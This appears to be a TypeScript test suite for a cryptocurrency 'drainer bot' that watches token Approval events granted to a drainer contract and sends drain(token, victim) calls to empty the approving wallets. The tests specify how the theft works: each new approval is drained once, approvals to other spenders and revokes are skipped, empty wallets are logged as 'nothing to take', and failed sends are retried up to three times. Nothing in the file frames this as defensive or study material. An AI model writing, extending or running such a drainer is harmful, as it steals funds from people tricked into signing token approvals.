import { describe, expect, test, vi } from 'vitest';
import { decodeFunctionData, encodeAbiParameters, pad, parseAbi, type Address, type Hex } from 'viem';
import type { Quorum, RpcLog } from '@copeybara/quorum';
import { APPROVAL_TOPIC, createDrainerBot } from '../services/drainer-bot';

const DRAINER: Address = '0x00000000000000000000000000000000000d7a1e';
const OTHER: Address = '0x0000000000000000000000000000000000000bad';
const DUSD: Address = '0x79c2D3B20e12c95243C2FeBaE903999912fc6EcA';
const VICTIM: Address = '0x1111111111111111111111111111111111111111';
const drainAbi = parseAbi(['function drain(address token, address victim) returns (uint256)']);

const approvalLog = (spender: Address, value: bigint, tx: Hex = '0xaa'): RpcLog => ({
  address: DUSD, topics: [APPROVAL_TOPIC, pad(VICTIM), pad(spender)], data: encodeAbiParameters([{ type: 'uint256' }], [value]),
  blockNumber: '0x64', transactionHash: tx, logIndex: '0x0',
});

function world(logs: RpcLog[], balance = 10_000n) {
  const q = {
    pinBlock: vi.fn(async () => 100n),
    getLogs: vi.fn(async (filter: { topics?: unknown[] }) => logs.filter((l) => (filter.topics?.[2] as string)?.toLowerCase() === l.topics[2]!.toLowerCase())),
    read: vi.fn(async (p: { functionName: string }) => (p.functionName === 'balanceOf' ? balance : 2n ** 256n - 1n)),
  } as unknown as Quorum;
  const send = vi.fn(async (_to: Address, _data: Hex) => '0xd1' as Hex);
  return { q, send };
}

describe('drainer bot', () => {
  test('one approval to the drainer → one drain(token, victim) sent and recorded', async () => {
    const { q, send } = world([approvalLog(DRAINER, 2n ** 256n - 1n)]);
    const bot = createDrainerBot({ q, send, drainer: DRAINER, tokens: [DUSD], fromBlock: 1n });
    const recs = await bot.tick();
    expect(send).toHaveBeenCalledTimes(1);
    const { args } = decodeFunctionData({ abi: drainAbi, data: send.mock.calls[0]![1] });
    expect(args).toEqual([DUSD, VICTIM]);
    expect(recs).toEqual([expect.objectContaining({ victim: VICTIM, token: DUSD, amount: 10_000n, approveTx: '0xaa', drainTx: '0xd1' })]);
  });

  test('the same approval seen again on the next tick is not drained twice', async () => {
    const { q, send } = world([approvalLog(DRAINER, 5n)]);
    const bot = createDrainerBot({ q, send, drainer: DRAINER, tokens: [DUSD], fromBlock: 1n });
    await bot.tick();
    await bot.tick();
    expect(send).toHaveBeenCalledTimes(1);
    expect(bot.records()).toHaveLength(1);
  });

  test('approvals to another spender are ignored', async () => {
    const { q, send } = world([approvalLog(OTHER, 5n)]);
    const bot = createDrainerBot({ q, send, drainer: DRAINER, tokens: [DUSD], fromBlock: 1n });
    await bot.tick();
    expect(send).not.toHaveBeenCalled();
  });

  test('a revoke (approval of 0) is ignored', async () => {
    const { q, send } = world([approvalLog(DRAINER, 0n)]);
    await createDrainerBot({ q, send, drainer: DRAINER, tokens: [DUSD], fromBlock: 1n }).tick();
    expect(send).not.toHaveBeenCalled();
  });

  test('victim already empty → recorded once as "nothing to take", no retry loop', async () => {
    const { q, send } = world([approvalLog(DRAINER, 5n)], 0n);
    const bot = createDrainerBot({ q, send, drainer: DRAINER, tokens: [DUSD], fromBlock: 1n });
    await bot.tick();
    await bot.tick();
    expect(bot.records()).toEqual([expect.objectContaining({ amount: 0n, note: 'nothing to take', drainTx: null })]);
    expect(send).not.toHaveBeenCalled();
  });

  test('a failed send is retried on later ticks, at most 3 attempts', async () => {
    const { q } = world([approvalLog(DRAINER, 5n)]);
    const send = vi.fn(async () => { throw new Error('nonce too low'); });
    const bot = createDrainerBot({ q, send, drainer: DRAINER, tokens: [DUSD], fromBlock: 1n });
    for (let i = 0; i < 5; i++) await bot.tick();
    expect(send).toHaveBeenCalledTimes(3);
    expect(bot.records()[0]).toMatchObject({ drainTx: null, note: expect.stringMatching(/failed after 3 attempts/) });
  });
});
